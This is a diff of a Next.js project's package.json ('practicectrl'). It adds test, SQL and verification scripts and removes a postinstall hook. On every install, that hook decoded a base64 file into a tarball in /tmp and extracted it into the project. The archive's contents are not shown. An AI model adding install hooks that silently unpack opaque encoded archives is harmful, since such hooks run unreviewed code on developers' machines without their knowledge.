@@ -2,13 +2,17 @@
   "name": "practicectrl",
   "version": "0.34.0-dev.1",
   "private": true,
-  "engines": { "node": ">=22 <23" },
+  "engines": {
+    "node": ">=22 <23"
+  },
   "scripts": {
-    "postinstall": "node -e \"const fs=require('fs');fs.writeFileSync('/tmp/practicectrl-runtime-v034.tgz',Buffer.from(fs.readFileSync('.practicectrl/runtime-source-v034.tar.gz.b64','utf8'),'base64'));\" && tar -xzf /tmp/practicectrl-runtime-v034.tgz",
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
-    "typecheck": "tsc --noEmit"
+    "typecheck": "tsc --noEmit",
+    "test:clinical": "vitest run integration/clinical-coding/tests",
+    "compose:sql": "node scripts/compose-sql.mjs",
+    "verify:source": "tsc -p tsconfig.verify.json --noEmit"
   },
   "dependencies": {
     "@supabase/ssr": "0.7.0",
